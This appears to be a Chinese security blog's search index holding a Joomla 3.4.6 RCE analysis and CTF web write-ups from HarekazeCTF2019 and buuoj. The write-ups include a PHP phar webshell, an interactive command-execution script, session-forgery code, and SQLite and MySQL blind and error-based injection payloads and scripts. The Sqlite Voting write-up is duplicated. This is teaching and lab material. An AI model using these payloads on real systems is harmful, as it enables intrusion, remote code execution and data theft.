<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Joomla 3.4.6 RCE 分析]]></title>
    <url>%2F2019%2F10%2F14%2FJoomla%203.4.6%20RCE%20%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Joomla 3.4.6 RCE 漏洞分析，首发先知社区: https://xz.aliyun.com/t/6522 漏洞环境及利用 Joomla 3.4.6 : https://downloads.joomla.org/it/cms/joomla3/3-4-6 PHP 版本: 5.5.38 Joomla 3.4 之前(包含3.4)不支持 PHP7.0 影响版本: 3.0.0 — 3.4.6 漏洞利用: https://github.com/momika233/Joomla-3.4.6-RCE 漏洞成因 本次漏洞主要是由于对 session 处理不当，从而可以伪造 session 从而导致 session 反序列化 漏洞分析session 逃逸 session 在 Joomla 中的处理有一些的问题，它会把没有通过验证的用户名和密码存储在 _session 表中 在登陆过程中，会有一个 303 的跳转，这个 303 是先把用户的输入存在数据库中，再从数据库中读取、对比，即先执行 write 函数在执行 read 函数 而且它的 csrf token 也在前端页面中 这两个函数位于 libraries/joomla/session/storage/database.php 中，内容如下: 可以看到，它在写入的过程中将 \x00*\x00 替换为 \0\0\0 ，因为 MySQL 中不能存储 NULL ，而 protected 变量序列化后带有 \x00*\x00 在读取过程中会重新把 \0\0\0 替换为 \x00*\x00 以便反序列化，但是这个替换将 3 字节的内容替换为 6 字节 如果提交的 username 为 per\0\0\0i0d ，那么在 read 时返回的数据就是 s:8:s:&quot;username&quot;;s:12:&quot;perNNNi0d&quot; N 代表 NULL，替换的大小为 9 字节，但是声明的是 12 字节，那么这将是一个无效的对象 那么就可以利用这个溢出来构造”特殊”的代码 值得一提的是，在进行 replace 后，反序列化时 username 会按照 54 的长度读取，读取到 password 字段处，以其结尾的 ; 作为结尾，而 password 字段的内容就逃逸出来，直接进行反序列化了。 思路 使用 \0\0\0 溢出，来逃逸密码 value 重新构建有效的对象 发送 exp 触发 exp 在数据库中 1s:8:s:&quot;username&quot;;s:54:&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot; 在读取置换之后 1s:8:s:&quot;username&quot;;s:54:&quot;NNNNNNNNNNNNNNNNNNNNNNNNNNN&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot; 实现对象注入 1s:8:s:&quot;username&quot;;s:54:&quot;NNNNNNNNNNNNNNNNNNNNNNNNNNN&quot;;s:8:&quot;password&quot;;s:6:&quot;1234&quot;;s:2:&quot;HS&quot;:O:15:&quot;ObjectInjection&quot; POP 链的构造 接下来就是 POP 链的构造 在 libraries/joomla/database/driver/mysqli.php 中的 __destruct() 触发 disconnect() 函数，对 disconnectHandlers 数组中的每个值，都会执行 call_user_func_array() ，并将 &amp;$this 作为参数引用，但是不能控制参数，利用条件是 $this-&gt;connection 为 true 1234567891011121314151617public function __destruct()&#123; $this-&gt;disconnect();&#125;public function disconnect()&#123; // Close the connection. if ($this-&gt;connection) &#123; foreach ($this-&gt;disconnectHandlers as $h) &#123; call_user_func_array($h, array( &amp;$this)); &#125; mysqli_close($this-&gt;connection); &#125; $this-&gt;connection = null;&#125; 但是在 libraries/simplepie/simplepie.php 中又有可以利用的，这里的函数和参数值都在我们的控制之下 这条语句执行的条件是 $this-&gt;cache 必须为 true ，$parsed_feed_url[&#39;scheme&#39;] 不为空 根据这些信息就能够构造出反序列化链了，如下图，可以很清晰看出构造方式 如果 zopatkgieeqqmifstiih 出现在返回页面就可以判断存在该漏洞 漏洞修复 对 session 信息进行 base64 或其他编码 参考链接 https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41 https://github.com/momika233/Joomla-3.4.6-RCE/blob/master/Joomla-3.4.6-RCE.py]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>Joomla</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HarekazeCTF2019 web 部分题解]]></title>
    <url>%2F2019%2F10%2F14%2FHarekazeCTF2019%20web%2F</url>
    <content type="text"><![CDATA[在 buuoj 上看到的这个比赛题目，期间平台关了，就拿了 Dockerfile 本地做了，web 题目感觉还不错 encode_and_encode [100] 打开靶机，前两个页面都是 html 页面，第三个给了页面源码 源码如下 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phperror_reporting(0); if (isset($_GET['source'])) &#123; show_source(__FILE__); exit();&#125; function is_valid($str) &#123; $banword = [ // no path traversal '\.\.', // no stream wrapper '(php|file|glob|data|tp|zip|zlib|phar):', // no data exfiltration 'flag' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125; $body = file_get_contents('php://input');$json = json_decode($body, true); if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json['page'])) &#123; $page = $json['page']; $content = file_get_contents($page); if (!$content || !is_valid($content)) &#123; $content = "&lt;p&gt;not found&lt;/p&gt;\n"; &#125; &#125; else &#123; $content = '&lt;p&gt;invalid request&lt;/p&gt;'; &#125; // no data exfiltration!!!$content = preg_replace('/HarekazeCTF\&#123;.+\&#125;/i', 'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;', $content);echo json_encode(['content' =&gt; $content]); file_get_contents(&#39;php://input&#39;) 获取 post 的数据，json_decode($body, true) 用 json 格式解码 post 的数据，然后 is_valid($body) 对 post 数据检验，大概输入的格式如下 is_valid($body) 对 post 数据检验，导致无法传输 $banword 中的关键词，也就无法传输 flag，这里在 json 中，可以使用 Unicode 编码绕过，flag 就等于 \u0066\u006c\u0061\u0067 通过检验后，获取 page 对应的文件，并且页面里的内容也要通过 is_valid 检验，然后将文件中 HarekazeCTF{} 替换为 HarekazeCTF{&amp;lt;censored&amp;gt;} ，这样就无法明文读取 flag 这里传入 /\u0066\u006c\u0061\u0067 后，由于 flag 文件中也包含 flag 关键字，所以返回 not found ，这也无法使用 file:// file_get_contents 是可以触发 php://filter 的，所以考虑使用伪协议读取，对 php 的过滤使用 Unicode 绕过即可 可以看出，json 在传输时是 Unicode 编码的 Avatar Uploader 1 [100] 给了源码，打开靶机，登录之后，是一个文件上传 首先 config.php 中定义了一些常量 然后在 upload.php 中判断文件大小，并使用 FILEINFO 判断上传图片类型，上传图片只能是 png 类型 后面再用 getimagesize 判断文件像素大小，并且再进行一次类型判断，如果不是 png 类型就给出 flag 在这两种判断上传图片类型的函数中，有一个很有趣的现象， FILEINFO 可以识别 png 图片( 十六进制下 )的第一行，而 getimagesize 不可以，代码如下 1234567&lt;?php$file = finfo_open(FILEINFO_MIME_TYPE); var_dump(finfo_file($file, "test")); $f = getimagesize("test"); var_dump($f[2] === IMAGETYPE_PNG); 结果，16进制文件也在下面 直接上传这个文件就可以获取 flag 了 Easy Notes [200] 给了源码，打开靶机，是一个笔记系统 在登陆处进行了匹配，只允许输入 4 到 64 位规定字符，且不是前端验证 登陆成功后，可以进行增删查和导出为 zip 或 tar 的功能，点击 Get flag 提示不是 admin 既然拿到源码就先看看全局配置 config.php ，就写了一行，定义临时文件目录 1define('TEMP_DIR', '/var/www/tmp'); 进入 page/flag.php 看一下给出 flag 的条件，要满足 is_admin() 函数 跟进 is_admin() 函数，没有发现什么可以利用的地方 看到有个导出功能，它会将添加的 note 导出为 zip，这个文件存放的位置在 TEMP_DIR ，和 session 信息保存在同一个位置，那么是不是可以考虑伪造 session session 文件以 sess_ 开头，且只含有 a-z，A-Z，0-9，- 看到 $filename 处可以满足所有的条件 构造 user 为 sess_ ，type 为 . ，经过处理之后，$path 就是 TEMP_DIR/sess_0123456789abcdef 这就伪造了一个 session 文件 然后向这个文件写入 note 的 title php 默认的 session 反序列化方式是 php ，其存储方式为 键名+竖线+经过serialize函数序列处理的值 ，这就可以伪造 admin 了 在最后，它会将构造的 $filename 返回，这样就可以拿到构造出的 admin 的 session 数据 很典型的 session 伪造，session 反序列化 利用脚本 123456789101112131415161718192021222324252627282930313233import reimport requestsURL = 'http://192.168.233.136:9000/'while True: # login as sess_ sess = requests.Session() sess.post(URL + 'login.php', data=&#123; 'user': 'sess_' &#125;) # make a crafted note sess.post(URL + 'add.php', data=&#123; 'title': '|N;admin|b:1;', 'body': 'hello' &#125;) # make a fake session r = sess.get(URL + 'export.php?type=.').headers['Content-Disposition'] print(r) sessid = re.findall(r'sess_([0-9a-z-]+)', r)[0] print(sessid) # get the flag r = requests.get(URL + '?page=flag', cookies=&#123; 'PHPSESSID': sessid &#125;).content.decode('utf-8') flag = re.findall(r'HarekazeCTF\&#123;.+\&#125;', r) if len(flag) &gt; 0: print(flag[0]) break Avatar Uploader 2 [300] 接 Uploader1 ，这里是找第二个 flag 给的 hint: https://php.net/manual/ja/function.password-hash.php upload.php 中可以利用的暂时已经利用完了，看一下 index.php 吧 index.php 代码简化大致如下 1234567891011121314151617181920212223242526272829303132&lt;?phperror_reporting(0);require_once('config.php');require_once('lib/util.php');require_once('lib/session.php');$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);if ($session-&gt;isset('flash')) &#123; $flash = $session-&gt;get('flash'); $session-&gt;unset('flash');&#125;$avatar = $session-&gt;isset('avatar') ? 'uploads/' . $session-&gt;get('avatar') : 'default.png' ;$session-&gt;save();include('common.css');include($session-&gt;get('theme', 'light') . '.css');if ($session-&gt;isset('name')) &#123; echo "Hello".$session-&gt;get('name')."&lt;/br&gt;";&#125;if ($flash) &#123; echo $flash['type']."&lt;/br&gt;"; echo $flash['message']."&lt;/br&gt;";&#125;if ($session-&gt;isset('name')) &#123; echo "Please upload"."&lt;/br&gt;";&#125; else &#123; echo "Please sign in"."&lt;/br&gt;";&#125; 这里的 session 处理机制是自己写的，在 lib\session.php 中，首先确认的事情是，登录后 HTTP 头部返回的 Cookie 是 session=******.****** 这种格式的 首先 __construct 中，判断 session 是否存在 $_COOKIE 中，如果存在则以 . 分割 session ，然后对 data 和 signature 进行 verify 函数认证，认证成功就返回数据的 json_decode 的结果 isset 中判断参数 $key 是否在 data 中，get 中返回 data 中 key 为参数 $key 的数据，set 中将 data 中 key 为参数 $key 的数据设置为参数 $value，unset 中删除 data 中 key 为参数 $key 的数据 save 中将 data 转化为 json 并进行 urlsafe_base64_encode，再用 sign 对 data 进行签名 这样整个 session.php 就完了，回到 index.php，然后进行的是 flash 的判断，找了一下，在 lib\util.php 中描述了 flash 并且给了调用 flash 函数的条件，即 error 函数，找了一下，error 在 upload.php 中，上传失败时调用 做的测试如图，flash 将错误信息保存在 session 中的 根据给的提示，password_hash 函数是存在安全隐患的，它的第一个参数不能超过 72 个字符，这个函数在 sign 中被调用，sign 被 save 调用，save 在 index.php 中被调用 password_hash 函数的漏洞就意味着只对前 72 个字符进行签名，只要前 72 个字符相同，那么就会在校验时通过 那么是不是可以登录一次，然后访问 upload.php 触发 error 函数，这样就能绕过 session 校验，然后对 data 信息进行修改，进而触发其他操作 可以看到，在 index.php 中存在一行代码 include($session-&gt;get(&#39;theme&#39;,&#39;light&#39;).&#39;.css&#39;); ，session 信息是由我们控制的，那么就可以通过 phar 协议，触发 LFI ，首先要把 phar 文件上传，里面复合一个假的 css 文件，存放一句话，这样就可以在 include 时触发 RCE 生成 phar 代码 1234567&lt;?php$png_header = hex2bin('89504e470d0a1a0a0000000d49484452000000400000004000');$phar = new Phar('exp.phar');$phar-&gt;startBuffering();$phar-&gt;addFromString('exp.css', '&lt;?php system($_GET["cmd"]); ?&gt;');$phar-&gt;setStub($png_header . '&lt;?php __HALT_COMPILER(); ?&gt;');$phar-&gt;stopBuffering(); 本地对这个 phar 做的一个测试 新登录一个用户，上传这个 phar，记录这个 phar 的地址和名字，然后去 upload.php 触发一次 error ，记录 data 和 signature ，修改 data ，增加 theme 键，键值为 phar 协议读取上传的文件，然后生成 session 再去访问 index.php 传入命令即可 exp.py 12345678910111213141516171819202122232425262728293031323334353637import base64import jsonimport reimport requestsimport urllib.parseurl = 'http://192.168.233.136:9003/'def b64decode(s): return base64.urlsafe_b64decode(s + '=' * (3 - (3 + len(s)) % 4))sess = requests.Session()username = b"peri0d".decode()url_1 = url + 'signin.php'sess.post(url=url_1, data=&#123;'name': username&#125;)url_2 = url + 'upload.php'f = open('exp.phar', 'rb')sess.post(url_2, files=&#123;'file': ('exp.png', f)&#125;)data = sess.cookies['session'].split('.')[0]data = json.loads(b64decode(data))avatar = data['avatar']url_3 = url + 'upload.php'sess.get(url_3, allow_redirects=False)data, sig = sess.cookies['session'].split('.')data = b64decode(data)payload = data.replace(b'&#125;&#125;', '&#125;&#125;,"theme":"phar://uploads/&#123;&#125;/exp"&#125;&#125;'.format(avatar).encode())sess.cookies.set('session', base64.b64encode(payload).decode().replace('=', '') + '.' + sig)while True: command = input('&gt; ') c = sess.get(url + '?cmd=' + urllib.parse.quote(command)).content.decode() result = re.findall(r'/\* light/dark.css \*/(.+)/\*\*/', c, flags=re.DOTALL)[0] print(result.strip()) Sqlite Voting [350] 打开靶机，看到投票的页面，并且给了源码 在 vote.php 页面 POST 参数 id ，只能为数字。并且在 schema.sql 中发现了 flag 表 1234567891011121314151617DROP TABLE IF EXISTS `vote`;CREATE TABLE `vote` ( `id` INTEGER PRIMARY KEY AUTOINCREMENT, `name` TEXT NOT NULL, `count` INTEGER);INSERT INTO `vote` (`name`, `count`) VALUES (&apos;dog&apos;, 0), (&apos;cat&apos;, 0), (&apos;zebra&apos;, 0), (&apos;koala&apos;, 0);DROP TABLE IF EXISTS `flag`;CREATE TABLE `flag` ( `flag` TEXT NOT NULL);INSERT INTO `flag` VALUES (&apos;HarekazeCTF&#123;&lt;redacted&gt;&#125;&apos;); 在 vote.php 中给出了查询的 SQL 语句，但是对参数进行了检测 1234567891011121314151617181920212223242526272829function is_valid($str) &#123; $banword = [ // dangerous chars // " % ' * + / &lt; = &gt; \ _ ` ~ - "[\"%'*+\\/&lt;=&gt;\\\\_`~-]", // whitespace chars '\s', // dangerous functions 'blob', 'load_extension', 'char', 'unicode', '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp', 'in', 'limit', 'order', 'union', 'join' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$id = $_POST['id'];if (!is_valid($id)) &#123; die(json_encode(['error' =&gt; 'Vote id contains dangerous chars']));&#125;$pdo = new PDO('sqlite:../db/vote.db');$res = $pdo-&gt;query("UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;");if ($res === false) &#123; die(json_encode(['error' =&gt; 'An error occurred while updating database']));&#125; UPDATE 成功与失败分别对应了不同的页面，那么是不是可以进行盲注，但是考虑到它过滤了 &#39; 和 &quot; 这就无法使用字符进行判断，char 又被过滤也无法使用 ASCII 码判断 所以可以考虑使用 hex 进行字符判断，将所有的的字符串组合用有限的 36 个字符表示 先考虑对 flag 16 进制长度的判断，假设它的长度为 x，y 表示 2 的 n 次方，那么 x&amp;y 就能表现出 x 二进制为 1 的位置，将这些 y 再进行或运算就可以得到完整的 x 的二进制，也就得到了 flag 的长度，而 1&lt;&lt;n 恰可以表示 2 的 n 次方 那么如何构造报错语句呢？在 sqlite3 中，abs 函数有一个整数溢出的报错，如果 abs 的参数是 -9223372036854775808 就会报错，同样如果是正数也会报错 判断长度的 payload : abs(case(length(hex((select(flag)from(flag))))&amp;{1&lt;&lt;n})when(0)then(0)else(0x8000000000000000)end) 脚本如下，长度 84 12345678910111213141516import requestsurl = "http://1aa0d946-f0a0-4c60-a26a-b5ba799227b6.node2.buuoj.cn.wetolink.com:82/vote.php"l = 0for n in range(16): payload = f'abs(case(length(hex((select(flag)from(flag))))&amp;&#123;1&lt;&lt;n&#125;)when(0)then(0)else(0x8000000000000000)end)' data = &#123; 'id' : payload &#125; r = requests.post(url=url, data=data) print(r.text) if 'occurred' in r.text: l = l|1&lt;&lt;nprint(l) 然后考虑逐字符进行判断，但是 is_valid() 过滤了大部分截取字符的函数，而且也无法用 ASCII 码判断 这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 ABCDEF ，这样十六进制的所有字符都可以使用了，并且使用 trim(0,0) 来表示空字符 123456789101112131415# hex(b'zebra') = 7A65627261# 除去 12567 就是 A ，其余同理A = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'C = 'trim(hex(typeof(.1)),12567)'D = 'trim(hex(0xffffffffffffffff),123)'E = 'trim(hex(0.1),1230)'F = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'# hex(b'koala') = 6B6F616C61# 除去 16CF 就是 BB = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||&#123;C&#125;||&#123;F&#125;)' 然后逐字符进行爆破，已经知道 flag 格式为 flag{} ，hex(b&#39;flag{&#39;)==666C61677B ，在其后面逐位添加十六进制字符，构成 paylaod 再利用 replace(length(replace(flag,payload,&#39;&#39;))),84,&#39;&#39;) 这个语句进行判断 如果 flag 不包含 payload ，那么得到的 length 必为 84 ，最外面的 replace 将返回 false ，通过 case when then else 构造 abs 参数为 0 ，它不报错 如果 flag 包含 payload ，那么 replace(flag, payload, &#39;&#39;) 将 flag 中的 payload 替换为空，得到的 length 必不为 84 ，最外面的 replace 将返回 true ，通过 case when then else 构造 abs 参数为 0x8000000000000000 令其报错 以上就可以根据报错爆破出 flag，最后附上出题人脚本 123456789101112131415161718192021222324252627282930313233343536373839# coding: utf-8import binasciiimport requestsURL = 'http://1aa0d946-f0a0-4c60-a26a-b5ba799227b6.node2.buuoj.cn.wetolink.com:82/vote.php'l = 0i = 0for j in range(16): r = requests.post(URL, data=&#123; 'id': f'abs(case(length(hex((select(flag)from(flag))))&amp;&#123;1&lt;&lt;j&#125;)when(0)then(0)else(0x8000000000000000)end)' &#125;) if b'An error occurred' in r.content: l |= 1 &lt;&lt; jprint('[+] length:', l)table = &#123;&#125;table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'table['C'] = 'trim(hex(typeof(.1)),12567)'table['D'] = 'trim(hex(0xffffffffffffffff),123)'table['E'] = 'trim(hex(0.1),1230)'table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||&#123;table["C"]&#125;||&#123;table["F"]&#125;)'res = binascii.hexlify(b'flag&#123;').decode().upper()for i in range(len(res), l): for x in '0123456789ABCDEF': t = '||'.join(c if c in '0123456789' else table[c] for c in res + x) r = requests.post(URL, data=&#123; 'id': f'abs(case(replace(length(replace(hex((select(flag)from(flag))),&#123;t&#125;,trim(0,0))),&#123;l&#125;,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)' &#125;) if b'An error occurred' in r.content: res += x break print(f'[+] flag (&#123;i&#125;/&#123;l&#125;): &#123;res&#125;') i += 1print('[+] flag:', binascii.unhexlify(res).decode()) 题目总结 json 传输时是 Unicode 编码的，可以使用 Unicode 编码来绕过一个关键词过滤 FILEINFO 可以识别 png 图片( 十六进制下 )的第一行，而 getimagesize 不可以 php 默认的 session 反序列化方式是 php ，其存储方式为 键名+竖线+经过serialize函数序列处理的值 ，默认保存在 /tmp 上传文件存放的位置在 TEMP_DIR ，和 session 信息保存在同一个位置，那么是不是可以考虑伪造 session password_hash 函数只对第一个参数的前 72 个字符有效 phar 是一系列文件的集合，通过 addFromString(filename, file_content) 写入信息，那么通过 phar://test.phar/filename 自然可以读取到，通常文件上传多可以考虑 phar sqlite3 盲注 bypass ，利用 replace() 和 length 进行爆破，trim() 替换空字符，trim() 和 hex() 构造字符，&amp; 特性获取长度等等，在 mysql 中也存在溢出的现象 参考链接 https://www.cnblogs.com/2881064178dinfeng/p/6150645.html https://www.cnblogs.com/lipcblog/p/7348732.html]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>HarekazeCTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[buuoj的几个SQL注入]]></title>
    <url>%2F2019%2F09%2F28%2Fbuu%20SQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[buuoj 上的几个注入，作为学校团队分享的材料 [强网杯 2019]随便注 堆叠注入 [SUCTF 2019]EasySQL easy_sql github 打开靶机，是这样的界面 直接用字典 fuzz 看一下过滤了哪些字符，如图 这个和强网杯相似，都是堆叠注入，在公开的源码中可以看到，传入的 query 长度不超过 40，强网杯的不能用了 关键的查询代码是 select $post[&#39;query&#39;]||flag from Flag 输入 1 或 0 查询结果如图，要想办法让 || 不是逻辑或 官方给的 payload 是 1;set sql_mode=PIPES_AS_CONCAT;select 1 拼接一下就是 select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag 关于 sql_mode : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 PIPES_AS_CONCAT 将 || 视为字符串的连接操作符而非 “或” 运算符 关于 sql_mode 更多可以查看这个链接 : MySQL sql_mode 说明 还有就是这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个 || 相当于是将 select 1 和 select flag from flag 的结果拼接在一起 关于非预期解 : *,1 拼接一下，不难理解 : select *,1||flag from Flag 等同于 select *,1 from Flag [RCTF2015]EasySQL EasySQL github 打开靶机，是如下界面 到注册页面，试了一下，username 和 email 处有过滤，直接 fuzz 一下哪些字符被禁了 注册成功之后，有一个修改密码的功能，这里的考点应该就是二次注入 它在存入数据库时进行了特殊字符的处理，但是在修改密码这里，从数据库中读取出来时，没有对数据处理 注册用户名 &#39;sss&quot;\ ，在修改密码处的有个报错的回显 可以猜出来 sql 语句应该是类似于这样子的 select * from user where username=&quot;&#39;sss&quot;\&quot; and password=&#39;d41d8cd98f00b204e9800998ecf8427e&#39; username=peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))# 经过测试，flag 不在 flag 表中 username=peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))# 发现输出有长度限制 username=peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;)&amp;&amp;(column_name)regexp(&#39;^r&#39;))),1))# username=peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))# 这里就很尴尬了，所以不如 reverse 逆序输出 username=peri0d&quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;f&#39;))),1))# 放个脚本，代表了这一题的整个流程，也记录的我的犯傻 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsurl_reg = 'http://7e4dcf86-135f-4bad-98e0-1b7ad8318aad.node2.buuoj.cn.wetolink.com:82/register.php'url_log = 'http://7e4dcf86-135f-4bad-98e0-1b7ad8318aad.node2.buuoj.cn.wetolink.com:82/login.php'url_change = 'http://7e4dcf86-135f-4bad-98e0-1b7ad8318aad.node2.buuoj.cn.wetolink.com:82/changepwd.php'pre = 'peri0d"'suf = "'))),1))#"s = 'abcdefghijklmnopqrstuvwxyz1234567890's = list(s)r = requests.session()def register(name): data = &#123; 'username' : name, 'password' : '123', 'email' : '123', &#125; r.post(url=url_reg, data=data)def login(name): data = &#123; 'username' : name, 'password' : '123', &#125; r.post(url=url_log, data=data) def changepwd(): data = &#123; 'oldpass' : '', 'newpass' : '', &#125; kk = r.post(url=url_change, data=data) if 'target' not in kk.text: print(kk.text)for i in s: paylaod = pre + "||(updatexml(1,concat((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + suf register(paylaod) login(paylaod) changepwd() [HarekazeCTF2019]Sqlite Voting 打开靶机，看到投票的页面，并且给了源码 在 vote.php 页面 POST 参数 id ，只能为数字。并且在 schema.sql 中发现了 flag 表 1234567891011121314151617DROP TABLE IF EXISTS `vote`;CREATE TABLE `vote` ( `id` INTEGER PRIMARY KEY AUTOINCREMENT, `name` TEXT NOT NULL, `count` INTEGER);INSERT INTO `vote` (`name`, `count`) VALUES (&apos;dog&apos;, 0), (&apos;cat&apos;, 0), (&apos;zebra&apos;, 0), (&apos;koala&apos;, 0);DROP TABLE IF EXISTS `flag`;CREATE TABLE `flag` ( `flag` TEXT NOT NULL);INSERT INTO `flag` VALUES (&apos;HarekazeCTF&#123;&lt;redacted&gt;&#125;&apos;); 在 vote.php 中给出了查询的 SQL 语句，但是对参数进行了检测 1234567891011121314151617181920212223242526272829function is_valid($str) &#123; $banword = [ // dangerous chars // " % ' * + / &lt; = &gt; \ _ ` ~ - "[\"%'*+\\/&lt;=&gt;\\\\_`~-]", // whitespace chars '\s', // dangerous functions 'blob', 'load_extension', 'char', 'unicode', '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp', 'in', 'limit', 'order', 'union', 'join' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$id = $_POST['id'];if (!is_valid($id)) &#123; die(json_encode(['error' =&gt; 'Vote id contains dangerous chars']));&#125;$pdo = new PDO('sqlite:../db/vote.db');$res = $pdo-&gt;query("UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;");if ($res === false) &#123; die(json_encode(['error' =&gt; 'An error occurred while updating database']));&#125; UPDATE 成功与失败分别对应了不同的页面，那么是不是可以进行盲注，但是考虑到它过滤了 &#39; 和 &quot; 这就无法使用字符进行判断，char 又被过滤也无法使用 ASCII 码判断 所以可以考虑使用 hex 进行字符判断，将所有的的字符串组合用有限的 36 个字符表示 先考虑对 flag 16 进制长度的判断，假设它的长度为 x，y 表示 2 的 n 次方，那么 x&amp;y 就能表现出 x 二进制为 1 的位置，将这些 y 再进行或运算就可以得到完整的 x 的二进制，也就得到了 flag 的长度，而 1&lt;&lt;n 恰可以表示 2 的 n 次方 那么如何构造报错语句呢？在 sqlite 中，abs 函数有一个整数溢出的报错，如果 abs 的参数是 -9223372036854775808 就会报错，同样如果是正数也会报错 判断长度的 payload : abs(case(length(hex((select(flag)from(flag))))&amp;{1&lt;&lt;n})when(0)then(0)else(0x8000000000000000)end) 脚本如下，长度 84 12345678910111213141516import requestsurl = "http://1aa0d946-f0a0-4c60-a26a-b5ba799227b6.node2.buuoj.cn.wetolink.com:82/vote.php"l = 0for n in range(16): payload = f'abs(case(length(hex((select(flag)from(flag))))&amp;&#123;1&lt;&lt;n&#125;)when(0)then(0)else(0x8000000000000000)end)' data = &#123; 'id' : payload &#125; r = requests.post(url=url, data=data) print(r.text) if 'occurred' in r.text: l = l|1&lt;&lt;nprint(l) 然后考虑逐字符进行判断，但是 is_valid() 过滤了大部分截取字符的函数，而且也无法用 ASCII 码判断 这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 ABCDEF ，这样十六进制的所有字符都可以使用了 123456789101112131415# hex(b'zebra') = 7A65627261# 除去 12567 就是 A ，其余同理A = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'C = 'trim(hex(typeof(.1)),12567)'D = 'trim(hex(0xffffffffffffffff),123)'E = 'trim(hex(0.1),1230)'F = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'# hex(b'koala') = 6B6F616C61# 除去 16CF 就是 BB = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||&#123;C&#125;||&#123;F&#125;)' 然后逐字符进行爆破，已经知道 flag 格式为 flag{} ，hex(b&#39;flag{&#39;)==666C61677B ，在其后面逐位添加十六进制字符，构成 paylaod 再利用 replace(length(replace(flag,payload,&#39;&#39;))),84,&#39;&#39;) 这个语句进行判断 如果 flag 不包含 payload ，那么得到的 length 必为 84 ，最外面的 replace 将返回 false ，通过 case when then else 构造 abs 参数为 0 ，它不报错 如果 flag 包含 payload ，那么 replace(flag, payload, &#39;&#39;) 将 flag 中的 payload 替换为空，得到的 length 必不为 84 ，最外面的 replace 将返回 true ，通过 case when then else 构造 abs 参数为 0x8000000000000000 令其报错 以上就可以根据报错爆破出 flag，最后附上出题人脚本 123456789101112131415161718192021222324252627282930313233343536373839# coding: utf-8import binasciiimport requestsURL = 'http://domain/vote.php'l = 0i = 0for j in range(16): r = requests.post(URL, data=&#123; 'id': f'abs(case(length(hex((select(flag)from(flag))))&amp;&#123;1&lt;&lt;j&#125;)when(0)then(0)else(0x8000000000000000)end)' &#125;) if b'An error occurred' in r.content: l |= 1 &lt;&lt; jprint('[+] length:', l)table = &#123;&#125;table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'table['C'] = 'trim(hex(typeof(.1)),12567)'table['D'] = 'trim(hex(0xffffffffffffffff),123)'table['E'] = 'trim(hex(0.1),1230)'table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||&#123;table["C"]&#125;||&#123;table["F"]&#125;)'res = binascii.hexlify(b'flag&#123;').decode().upper()for i in range(len(res), l): for x in '0123456789ABCDEF': t = '||'.join(c if c in '0123456789' else table[c] for c in res + x) r = requests.post(URL, data=&#123; 'id': f'abs(case(replace(length(replace(hex((select(flag)from(flag))),&#123;t&#125;,trim(0,0))),&#123;l&#125;,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)' &#125;) if b'An error occurred' in r.content: res += x break print(f'[+] flag (&#123;i&#125;/&#123;l&#125;): &#123;res&#125;') i += 1print('[+] flag:', binascii.unhexlify(res).decode())]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
